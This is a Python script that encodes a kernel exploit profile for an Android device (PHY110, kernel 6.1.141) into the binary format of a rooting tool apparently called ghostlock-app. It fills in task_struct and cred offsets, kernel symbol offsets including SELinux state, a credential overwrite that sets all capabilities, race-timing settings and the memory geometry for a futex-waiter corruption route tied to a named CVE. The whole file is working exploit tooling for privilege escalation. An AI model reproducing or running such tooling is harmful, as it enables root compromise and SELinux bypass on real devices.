#!/usr/bin/env python3
"""Encode the PHY110 GhostLock kernel profile into the GLK1 v2 binary
transport understood by ghostlock-app's native binary
(`--load-prebuilt-profile <file>`).

Format (reverse-engineered from src/core/profile/binary.cpp of
YuKongA/ghostlock-app):

  header  : magic u32 LE 0x0D000721 | version u16 LE 2
            | frontend u16 LE (1=RootChild) | backend u16 LE (1=CVE-2026-43499)
            | middleware u16 LE (route: 1=TcpZerocopy)
            | release_len u16 LE | release bytes
  body    : section_count u16 LE, then per section:
            name_len u8 | name | entry_count u32 LE, then per entry:
            key_len u8 | key | value u64 LE

Only sections with at least one present field are emitted; route sections of
non-active routes are skipped. PLAIN fields are always present; OPT fields are
present when set. Values are written raw (two's complement for signed).

This removes the need to build the Android app (Gradle) just to load a profile.
"""
import json
import os
import struct
import sys

BASE = "C:/Other/Andriod/ROM/phy110_extract"
IMAGE_BASE = 0xFFFFFFC008000000

RELEASE = "6.1.141-android14-11-o-g984c12362a16"

MAGIC = 0x0D000721
VERSION = 2
FRONTEND_ROOTCHILD = 1
BACKEND_CVE202643499 = 1
ROUTE_TCP_ZEROCOPY = 1
ROUTE_SELECT_STACK = 2
ROUTE_MULTICAST_WAITER = 3

# PHY110 native 64-bit punch geometry (HANDOFF 21):
#   rt_sigreturn bulk-copies the sigframe fpsimd vregs (0x200 B) into
#   __arm64_sys_rt_sigreturn's stack local at sp+0x30 (frame 0x2b0)
#   => depth band [0x80, 0x280]; the 64-bit futex rt_mutex_waiter sits at
#   depth 0x80+0x1b0-0x98 = 0x198  =>  waiter_off = 0x280 - 0x198 = 0xe8
#   field offsets from BTF (sizeof(struct rt_mutex_waiter) = 0x58).
MCAST_WAITER_OFF = 0xE8
MCAST_BUFFER_SIZE = 0x200
MCAST_TASK_OFFSET = 0x30
MCAST_LOCK_OFFSET = 0x38


def off(syms, name):
    v = syms.get(name)
    if v is None:
        sys.exit(f"FATAL: symbol {name} missing")
    return int(v, 16) - IMAGE_BASE


def build():
    syms = json.load(open(f"{BASE}/symbols.json", encoding="utf-8"))

    sections = []

    def sec(name, entries):
        present = [(k, v) for k, v in entries if v is not None]
        if present:
            sections.append((name, present))

    sec("meta", [
        ("kernel_major", 6),
        ("recommend_shizuku", 0),
        ("fallback_route", 0),  # none
        ("safe_mode", 0),
    ])

    sec("task_struct", [
        ("prio", 0x84), ("normal_prio", 0x8C), ("sched_task_group", 0x348),
        ("pi_lock", 0x924), ("pi_waiters", 0x938), ("pi_top_task", 0x948),
        ("pi_blocked_on", 0x950), ("pid", 0x630), ("tgid", 0x634),
        ("atomic_flags", 0x5F0), ("real_cred", 0x830), ("cred", 0x838),
        ("comm", 0x848), ("tasks", 0x550), ("seccomp", 0x900),
    ])

    # PHY110 6.1: sizeof(struct cred) = 176 (CONFIG_KEYS=y), so security@120 /
    # user@128 / user_ns@136 / ucounts@144 / group_info@152.  The copy covers
    # ONLY the scalar fields (usage + ids + securebits + caps = 0x00..0x50) so
    # every pointer field keeps the caller's original value -> no refs needed.
    # caps_offset 48 = cap_permitted, 3 caps = permitted/effective/bset.
    sec("cred", [
        ("copy_size", 80), ("usage_offset", 0), ("usage_value", 256),
        ("caps_offset", 48), ("caps_count", 3), ("caps_value", -1),
        ("ref_count", 0), ("ref0_offset", None), ("ref1_offset", None),
        ("ref2_offset", None), ("ref3_offset", None),
        ("ref0_image", None), ("ref1_image", None),
        ("ref2_image", None), ("ref3_image", None),
    ])

    sec("offset", [
        ("init_task", off(syms, "init_task")),
        ("init_cred", off(syms, "init_cred")),
        ("empty_zero_page", off(syms, "empty_zero_page")),
        ("root_task_group", off(syms, "root_task_group")),
        ("selinux_enforcing", off(syms, "selinux_state")),  # BTF: enforcing @ +0
        ("selinux_blob_sizes", off(syms, "selinux_blob_sizes")),
        ("security_hook_heads", off(syms, "security_hook_heads")),
        ("slide_nfulnl_logger", off(syms, "nfulnl_logger")),
        ("slide_loggers_0_1", off(syms, "loggers") + 8),
        ("slide_boot_id", off(syms, "sysctl_bootid")),
    ])

    sec("kernel", [
        ("kernel_phys_load", 0xA8000000),
        ("kernel_phys_offset", 0x80000000),
        ("compact_waiter", 1),
        ("kernelsnitch_collisions", 4),
        ("mm_struct_sz", 1024),
    ])

    # CPU pair is a race-timing knob: main runs the owner/waiter side, consumer
    # the puncher side. Overridable: `ghostlock_glk1.py <main> <consumer> [tcp|mcast]`.
    main_cpu = int(sys.argv[1]) if len(sys.argv) > 1 else 0
    consumer_cpu = int(sys.argv[2]) if len(sys.argv) > 2 else 1
    route = os.environ.get("GL_ROUTE", "tcp")
    if len(sys.argv) > 3:
        route = sys.argv[3]
    sec("execution.recommended_cpus", [("main", main_cpu), ("consumer", consumer_cpu)])
    sec("execution.heap", [
        ("prepare_max_attempts", 4), ("prepare_timeout_ms", 240000),
        ("kernelsnitch_timeout_ms", 60000),
    ])
    sec("execution.race", [
        ("route_wait_ms", 1000), ("route_done_timeout_ms", 300000),
        ("setup_settle_us", 50000), ("state_poll_interval_us", 1000),
    ])
    sec("execution.stages", [
        ("w1_attempts", 15), ("w1_settle_us", 100000),
        ("w1_scratch_repair_attempts", 3), ("w2_attempts", 15),
        ("w2_settle_us", 100000), ("w3_chain_rounds", 3),
        ("w3_attempts", 6), ("w3_settle_us", 50000),
    ])
    sec("execution.handoff", [
        ("pre_dispatch_settle_ms", 2000), ("module_poll_attempts", 30),
        ("module_poll_interval_ms", 100), ("enforce_poll_attempts", 200),
        ("enforce_poll_interval_ms", 100),
    ])
    sec("execution.consumer", [("max_calls", 1), ("burst_calls", 1)])

    # only the active route's section
    if route == "mcast":
        sec("route.multicast_waiter", [
            ("waiter_off", MCAST_WAITER_OFF),
            ("buffer_size", MCAST_BUFFER_SIZE),
            ("task_offset", MCAST_TASK_OFFSET),
            ("lock_offset", MCAST_LOCK_OFFSET),
        ])
    else:
        sec("route.tcp_zerocopy", [
            ("attempts", 200), ("arm_sequence", 16),
            ("post_receive_hold_iterations", 20000),
        ])

    wire_route = ROUTE_MULTICAST_WAITER if route == "mcast" else ROUTE_TCP_ZEROCOPY

    out = bytearray()
    # header is 16 bytes (kHeaderSize): magic/version/frontend/backend/route/
    # release_len fill 0..13; bytes 14-15 are reserved zero padding (serialize()
    # memsets the whole header first and never writes them), release starts at 16.
    out += struct.pack("<IHHHHHH", MAGIC, VERSION, FRONTEND_ROOTCHILD,
                       BACKEND_CVE202643499, wire_route, len(RELEASE), 0)
    assert len(out) == 16
    out += RELEASE.encode()
    out += struct.pack("<H", len(sections))
    for name, entries in sections:
        nb = name.encode()
        out += bytes([len(nb)]) + nb + struct.pack("<I", len(entries))
        for key, value in entries:
            kb = key.encode()
            out += bytes([len(kb)]) + kb + struct.pack("<q", value)

    path = f"{BASE}/ghostlock-phy110.glk1"
    open(path, "wb").write(bytes(out))
    print(f"wrote {path} ({len(out)} bytes, {len(sections)} sections)")
    for name, entries in sections:
        print(f"  [{name}] {len(entries)} fields")


if __name__ == "__main__":
    build()
